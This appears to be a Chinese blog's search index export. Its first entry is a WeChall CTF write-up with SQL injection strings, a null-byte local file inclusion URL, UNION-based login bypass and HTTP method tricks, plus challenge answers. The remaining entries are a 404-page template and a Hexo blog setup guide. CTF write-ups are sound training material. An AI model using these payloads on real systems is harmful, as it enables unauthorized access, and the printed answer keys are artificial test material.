0817本地文件包含，代码如下： &lt;?php if (isset($_GET[&apos;which&apos;])) { $which = $_GET[&apos;which&apos;]; switch ($which) { case 0: case 1: case 2: require_once $which.&apos;.php&apos;; break; default: echo GWF_HTML::error(&apos;PHP-0817&apos;, &apos;Hacker NoNoNo!&apos;, false); break; } } 要求是包含solution.php. http://www.wechall.net/challenge/php0817/index.php?which=solution Training: MySQL I简单的sql注入 万能密钥： admin’or’1’=’1 Training: Programming 1就是一个简单的post数据包。 就是先获取生成随机数那个页面的 http 头。然后把自己的 Cookie 加上去。 然后请求这个页面，得到字符串，将其拼接在提交页面的 url 上。 再请求提交页面的 http 头，并添加自己的 Cookie，最后请求即可。 Warning: 这个网站在国外，但是打开一个页面就要 1 秒多。所以国内跑这个脚本肯定超时。这时候你就需要一台国外服务器来跑这个脚本。 Training: PHP LFI本地文件包含+零零截断。 源码如下： $filename = &apos;pages/&apos;.(isset($_GET[&quot;file&quot;])?$_GET[&quot;file&quot;]:&quot;welcome&quot;).&apos;.html&apos;; include $filename; 会在file的前面加上pages/后面加上welcome 所以结果就是：pages/file.html 所以构造如下代码： http://www.wechall.net/challenge/training/php/lfi/up/index.php?file=../../solution.php%00 Training: Encodings I本来按照正常思路是先8个8个一组，分到最后发现不对，不是8的倍数。然后百度，原来重点是提示的：English。 英文字母所用的ascii字符只占用七个bit（即7位） 脚本如下： str1=&quot;101010011010001101001111001101000001110100110010111110001110100010000011010011110011010000001101110101101110001011010011110100010000011001011101110110001111011111100100110010111001000100000110000111100111100011110100111010010101110010000010110011101111111010111100100100000111000011000011110011111001111101111101111111001011001000100000110100111100110100000110010111000011110011111100111100111110100110000111100101110100110010111100100101110&quot; print len(str1) def res(str1): length = len(str1) for i in range(length/7): yield str1[i*7:(i+1)*7] s=&quot;&quot; for r in res(str1): s += chr(int(r,2)) //将二进制的字符串变成整形的十进制 print s yield关键字用来定义生成器（Generator），其具体功能是可以当return使用，从函数里返回一个值，不同之处是用yield返回之后，可以让函数从上回yield返回的地点继续执行。也就是说，yield返回函数，交给调用者一个返回值，然后再“瞬移”回去，让函数继续运行， 直到吓一跳yield语句再返回一个新的值。 int(r,2)2是表示转化为十进制，默认的是0 This text is 7-bit encoded ascii. Your password is easystarter. Training: Crypto - Transposition I置换密码：就是明文的字母保持相同，但顺序被打乱了。 密文如下： oWdnreuf.lY uoc nar ae dht eemssga eaw yebttrew eh nht eelttre sra enic roertco drre . Ihtni koy uowlu dilekt oes eoyrup sawsro don:wa nrrabflmag.b 脚本如下： s=&apos;oWdnreuf.lY uoc nar ae dht eemssga eaw yebttrew eh nht eelttre sra enic roertco drre . Ihtni koy uowlu dilekt oes eoyrup sawsro don:wa msmniaocam.d&apos; for i in range(0,len(s),2): res=&apos;&apos; t= (s[i + 1] + s[i]) res +=t print res 说明：字符串的长度为148，所以可以换的话就有： 两两互换即o，W互换，d，n互换…共74对 四四互换即oWdn，reuf互换，.lY ，uoc 互换…共37对 37,37互换… 74,74互换… Wonderful. You can read the message way better when the letters are in correct order. I think you would like to see your password now: asmnmaicomad. Training: Register GlobalsPHP全局变量 源码如下： ... if (isset($login)) { echo GWF_HTML::message(&apos;Register Globals&apos;, $chall-&gt;lang(&apos;msg_welcome_back&apos;, array(htmlspecialchars($login[0]), htmlspecialchars($login[1])))); if (strtolower($login[0]) === &apos;admin&apos;) { $chall-&gt;onChallengeSolved(GWF_Session::getUserID()); } ... 代码中检测login，如果login[0]=’admin’输出信息。 构造代码如下： http://www.wechall.net/challenge/training/php/globals/globals.php?login[0]=admin No Escapeupdate注入 如果一直点一个人的话，会一直增长，如果有人达到100，所有人重置。 执行以下代码： http://www.wechall.net/challenge/no_escape/index.php?vote_for=bil 回显为： GDO Error(1054): Unknown column ‘bil’ in ‘field list’UPDATE noescvotes SET bil=bil+1 WHERE id=1 构造如下语句： bill`=111%23 则sql语句为： UPDATE noescvotes SET bill=111%23=bill`+1 WHERE id=1 构造URL： http://www.wechall.net/challenge/no_escape/?vote_for=bill`=111%23 Training: Crypto - Substitution I单表置换密码 密文如下： DK OAM VTFXLAOK LIG KIQ PVE BMVG OAXH FK RBXMEG X VF XFZBMHHMG YMBK CMTT GIEM KIQB HITQOXIE UMK XH ZMFLMZXAFEXL OAXH TXOOTM PAVTTMELM CVH EIO OII AVBG CVH XO 密钥短语密码就是选一个英文短语作为密钥字(Key Word)或密钥短语(Key Phrase)，如HAPPY NEW YEAR，去掉重复字母得HAPYNEWR。将它依次写在明文字母表之下，而后再将字母表中未在短语中出现过的字母依次写于此短语之后，就可构造出一个字母代换表： 对照表就行了。 免费破解地址 BY THE ALMIGHTY GOD YOU CAN READ THIS MY FRIEND I AM IMPRESSED VERY WELL DONE YOUR SOLUTION KEY IS PEMGEPIHMNIG THIS LITTLE CHALLENGE WAS NOT TOO HARD WAS IT hi说了那么多屁话，就是一个等差数列。 第一分钟是2，以后依次加一，最后一项是17591026060781 所以总共有(2+17591026060781)*17591026060781/2 发现结果竟然是小数，改为(2+17591026060782)*17591026060782/2竟然对了。。。 Training: MySQL II.htaccess username password分开来验证。通常的利用方法是使用union构造已知MD5值的查询。 构造语句： username=-1&apos; union select 1,&apos;admin&apos;,&apos;e10adc3949ba59abbe56e057f20f883e&apos; %23&amp;password=123456&amp;login=Login 这句话首先通过username=-1将原语句报错。因此返回的将会是第二条语句产生的信息。而我们union select的是直接构造了用户名为admin，密码为123456的md5值。这样就可以让程序误认为我们构造的信息就是它从数据库里面提取得到的信息。 Limited Access让我们访问.htaccess 源码如下： AuthUserFile .htpasswd AuthGroupFile /dev/null AuthName &quot;Authorization Required for the Limited Access Challenge&quot; AuthType Basic &lt;Limit GET&gt;require valid-user &lt;/Limit&gt; 源码中限制了GET 所以使用post即可 Training: Regex正则表达式 匹配一个空字符就行了。 正则表达式匹配空值方式如下： \b 匹配单词开头或结尾位置 ^ 匹配字符串开端位置 $ 匹配字符串结尾位置 \s 匹配一切空白字符 \n 匹配换行 代码如下： /^$/ Training: Crypto - Caesar IIs = &apos;77 1F 1F 14 20 1A 1F 12 5C 20 29 1F 25 20 23 1F 1C 26 15 14 20 1F 1E 15 20 1D 1F 22 15 20 13 18 11 1C 1C 15 1E 17 15 20 19 1E 20 29 1F 25 22 20 1A 1F 25 22 1E 15 29 5E 20 04 18 19 23 20 1F 1E 15 20 27 11 23 20 16 11 19 22 1C 29 20 15 11 23 29 20 24 1F 20 13 22 11 13 1B 5E 20 07 11 23 1E 57 24 20 19 24 6F 20 61 62 68 20 1B 15 29 23 20 19 23 20 11 20 21 25 19 24 15 20 23 1D 11 1C 1C 20 1B 15 29 23 20 11 13 15 5C 20 23 1F 20 19 24 20 23 18 1F 25 1C 14 1E 57 24 20 18 11 26 15 20 24 11 1B 15 1E 20 29 1F 25 20 24 1F 1F 20 1C 1F 1E 17 20 24 1F 20 14 15 13 22 29 20 24 20 24 18 19 23 20 1D 15 23 23 11 17 15 5E 20 07 15 1C 1C 20 14 1F 1E 15 5C 20 29 1F 25 22 20 23 1F 1C 25 24 19 1F 1E 20 19 23 20 1D 20 23 11 22 22 15 23 20 1D 1E 17 5E&apos; s = s.split() for key in range(0,128+1,1): for i in s: i = int(i,16) print (chr((i + key + 256) % 256 ), end = &apos;&apos;) print (key) key=80时 Çoodpjob¬pyoupsolvedponepmorepchallengepinpyourpjourney®pThisponepwaspfairlypeasyptopcrack®pWasn§tpit¿p±²¸pkeyspispapquitepsmallpkeyspace¬psopitpshouldn§tphaveptakenpyouptooplongptopdecryptpthispmessage®pWellpdone¬pyourpsolutionpispmpsarrespmng® Stegano Attachment下载图片之后，notepad打开 发现：solution.txt 改后缀为rar IDSRGRNENMPS Training: LSB放入神器stegsolve中 CBNMGNBFMOHN Limited Access Too访问.htaccess发现几乎过滤了所有方法 GET POST HEAD PUT DELETE CONNECT OPTIONS php会将TO方法给解析成GET方法。那么我们就可以抓包，改为TO 使用move方法 PHP 0815源码如下： &lt;? $whitelist = array(1, 2, 3); if (false === ($show = isset($_GET[&apos;show&apos;]) ? $_GET[&apos;show&apos;] : false)) { die(&apos;MISSING PARAMETER; USE foo.bar?show=[1-3]&apos;); } elseif (in_array($show, $whitelist)){ $query = &quot;SELECT 1 FROM `table` WHERE `id`=$show&quot;; echo &apos;Query: &apos;.htmlspecialchars($query, ENT_QUOTES).&apos;&lt;br/&gt;&apos;; die(&apos;SHOWING NUMBER &apos;.htmlspecialchars($show, ENT_QUOTES)); }else { die(&apos;HACKER NONONO&apos;); } 这明显是SQL注入，但是防注入的方法有很多，需要找到最简单的，于是找到一个方法： 将传入的参数需要转换成整数。 通常所用的函数是int()或者intval() 然而出于php wtf的atoi转换规则，$show-0足以完成 htmlspecialchars这题是xss，借这个，再写一篇xss的总结。]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>writeup</tag>
        <tag>WeChall</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[创建404页面]]></title>
    <url>%2F2015%2F10%2F13%2F%E5%88%9B%E5%BB%BA404%E9%A1%B5%E9%9D%A2%2F</url>
    <content type="text"><![CDATA[自定义页面以404页面为例 执行命令 $ hexo new page &quot;404&quot; INFO Created: D:\Hexo\Hexo\source\404\index-1.md 编写代码如下： title: 404 Not Found：该页无法显示 comments: false permalink: /404 fancybox: false --- &lt;style type=&quot;text/css&quot;&gt; .article-title { font-size: 2.1em; } strong a { color: #747474; } .share { display: none; } .player { margin-left: -10px; } .sign { text-align: right; font-style: italic; } #page-visit { display: none; } .center { text-align: center; height: 2.5em; font-weight: bold; } .search2 { height: 2.2em; font-size: 1em; width: 50%; margin: auto 24%; color: #727272; opacity: .6; border: 2px solid lightgray; } .search2:hover { opacity: 1; box-shadow: 0 0 10px rgba(0, 0, 0, 0.3) }; .article-entry hr { margin: 0; } .pic { text-align: center; margin: 0; } .pic br { display: none; } &lt;/style&gt; *** &lt;div class=&quot;pic&quot;&gt; &lt;img src=&quot;/img/404.jpg&quot; title=&quot;Mihawk-Wind&quot;&gt; &lt;/div&gt; &lt;p class=&quot;center&quot;&gt;很抱歉，您所访问的地址并不存在: &lt;/p&gt; &lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/&quot;&gt;回主页&lt;/a&gt; · &lt;a href=&quot;/archives&quot;&gt;所有文章&lt;/a&gt; · &lt;a href=&quot;/about&quot;&gt;关于&lt;/a&gt;&lt;/p&gt; &lt;p class=&quot;center&quot;&gt;可在边栏搜索框中对本站进行检索，以获取相关信息。&lt;/p&gt; &lt;div style=&quot;text-align: center&quot;&gt; 以下是博主喜欢的一些歌曲，可以听听，稍作休息~ &lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=320 height=330 src=&quot;http://music.163.com/outchain/player?type=0&amp;id=112513213&amp;auto=0&amp;height=430&quot;&gt;&lt;/iframe&gt; &lt;/div&gt;]]></content>
      <tags>
        <tag>前端</tag>
        <tag>编程</tag>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Github+Hexo搭建独立博客]]></title>
    <url>%2F2015%2F09%2F13%2F%E4%BD%BF%E7%94%A8Github-Hexo%E6%90%AD%E5%BB%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[应用GitHub Pages创建属于自己的个人博客，GitHub将提供免费的空间。GitHub提供的域名（用户名+github+io）,在Repository name对应处填写资源名，其需要使用自己的用户名，每个用户名下面只能建立一个，并且资源命名必须符合这样的规则username/username.github.io，之后勾选下面的”Initialize this repository with a README” 安装准备环境搭建： Node.js：下载地址 Git：下载地址#GitHub注册与配置 注册地址 具体配置及使用请参照：使用Github Pages搭建独立博客 配置并添加SSH KEY到Github 测试 可以输入下面的命令，看看设置是否成功，git@github.com的部分不要修改： $ ssh -T git@github.com 如果是下面的反馈： The authenticity of host ‘github.com (207.97.227.239)’ can’t be established.RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.Are you sure you want to continue connecting (yes/no)? 不要紧张，输入yes就好，然后会看到： Hi cnfeat! You’ve successfully authenticated,but GitHub does not provide shell access. 设置用户信息：现在你已经可以通过SSH链接到GitHub了，还有一些个人信息需要完善的。 Git会根据用户的名字和邮箱来记录提交。 $ git config –global user.name “cnfeat”//用户名$ git config –global user.email “cnfeat@gmail.com”//填写自己的邮箱 SSH Key配置成功，本机已成功连接到github. HexoHexo是一个简单、快速、强大的博客发布工具，支持Markdown格式。 安装新建一个文档 当作博客根目录（尽量不要有中文），在此目录下打开Git Bash（前提确保Node.js已经安装，环境配置OK） $ npm install -g hexo $ hexo init $ hexo generate $ hexo server 打开本地http://localhost:4000/你就可以看到hexo网站了。 注： hexo server启动之后无法访问：使用-p参数改端口 npm命令找不到：使用npm.cmd,或者卸载重装 git命令找不到：git init先初始化部署到GitHub编辑hexo目录下的_config.yml（此文件为你网站的配置文件) 修改代码如下：123type: gitrepository: http://github.com/drops123456/drops123456.github.io.git branch: master 然后执行： hexo g 编译生成静态文件 hexo d 发布到Github 访问：http://username.github.io/即可看到网站。 如果需要使用别的域名，在根目录下创建文件CNAME内容为你的域名即可（关于A记录和CNAME，请参考：域名解析的区别） clone主题选择一个主题 使用命令 git clone http://example.com 下载zip包 在把下载的主题拷贝到hexo/themes目录下，配置_config.yml theme: yelee 部署主题$ hexo g #生成 $ hexo s #启动本地服务，进行文章预览调试 实例example以我的网站的配置，如下： # Hexo Configuration ## Docs: https://hexo.io/docs/configuration.html ## Source: https://github.com/hexojs/hexo/ # Site title: Joy_nick subtitle: No pains, No gains！ description: No pains, No gains！ author: Joy_nick language: zh-CN timezone: # URL ## If your site is put in a subdirectory, set url as &apos;http://yoursite.com/child&apos; and root as &apos;/child/&apos; url: http://byd.dropsec.xyz root: / permalink: :year/:month/:day/:title/ permalink_defaults: # Directory source_dir: source public_dir: public tag_dir: tags archive_dir: archives category_dir: categories code_dir: downloads/code i18n_dir: :lang skip_render: # Writing new_post_name: :title.md # File name of new posts default_layout: post titlecase: false # Transform title into titlecase external_link: true # Open external links in new tab filename_case: 0 render_drafts: false post_asset_folder: false relative_link: false future: true highlight: enable: true line_number: true auto_detect: false tab_replace: # Category &amp; Tag default_category: uncategorized category_map: tag_map: # Date / Time format ## Hexo uses Moment.js to parse and display date ## You can customize the date format as defined in ## http://momentjs.com/docs/#/displaying/format/ date_format: YYYY-MM-DD time_format: HH:mm:ss # Pagination ## Set per_page to 0 to disable pagination per_page: 8 pagination_dir: page # Extensions ## Plugins: https://hexo.io/plugins/ ## Themes: https://hexo.io/themes/ theme: yelee feed: #之后配置rss会用，使用如下配置即可 type: atom path: atom.xml limit: 20 # Deployment ## Docs: https://hexo.io/docs/deployment.html deploy: type: git repository: http://github.com/drops123456/drops123456.github.io.git branch: master 发布新的文章 cd到网站根目录下 $ hexo new “My New Post” [info] File created at d:\Hexo\source_posts\My-New-Post.md 编译生成静态文件 hexo g 部署到Github hexo d也可以使用命令：hexo g -d 注：建议每次部署前，先本地查看 命令总结hexo n == hexo new hexo g == hexo generate hexo s == hexo server hexo d == hexo deploy hexo new &quot;postName&quot; #新建文章 hexo new page &quot;pageName&quot; #新建页面 hexo generate #生成静态页面至public目录 hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server） hexo deploy #将.deploy目录部署到GitHub hexo help # 查看帮助 hexo version #查看Hexo的版本]]></content>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
</search>
